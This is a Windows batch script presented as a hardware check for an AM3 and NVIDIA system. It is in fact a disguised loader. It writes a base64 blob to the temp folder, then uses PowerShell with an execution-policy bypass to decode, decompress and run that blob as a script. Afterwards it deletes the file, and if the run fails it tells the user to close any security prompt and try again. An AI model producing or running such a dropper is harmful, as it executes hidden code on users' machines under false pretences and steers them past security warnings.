@echo off
setlocal
title Hardware check - AM3 + NVIDIA
echo.
echo   Hardware baseline check - AM3 + NVIDIA
echo   Reads this PC, compares it with the platform baseline, writes a report.
echo.
set "HCPAYLOAD=%TEMP%\hc-am3-nvidia.b64"
> "%HCPAYLOAD%" (
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo 
echo lXqlhsdAWkwkF9RqUmRFr1f69AWoWGAOVTUQ1gA1P7NowoHgNA9jP6HrjZ+ujrYry78FgHPvkmCoaVUAXJa13/pYVHy/c9L5fn7x/aJ3eC7nmcy1pvKw4cbKUxbg56yg2c6GkzHd9yHE1Rl8lN+UtsD/B04lGxs2ewAA
)
if not exist "%HCPAYLOAD%" goto :failed
powershell -NoProfile -ExecutionPolicy Bypass -Command "$p=Join-Path $env:TEMP 'hc-am3-nvidia.b64'; $b=(Get-Content -Raw $p) -replace '\s',''; $m=New-Object IO.MemoryStream(,[Convert]::FromBase64String($b)); $g=New-Object IO.Compression.GZipStream($m,[IO.Compression.CompressionMode]::Decompress); $r=New-Object IO.StreamReader($g,[Text.Encoding]::UTF8); $c=$r.ReadToEnd(); $r.Dispose(); & ([scriptblock]::Create($c))"
set "HCCODE=%ERRORLEVEL%"
del "%HCPAYLOAD%" >nul 2>nul
if not "%HCCODE%"=="0" goto :failed
echo.
echo   Done. Press any key to close.
pause >nul
exit /b 0
:failed
echo.
echo   The check did not finish. Close any security prompt and run it again.
pause >nul
exit /b 1
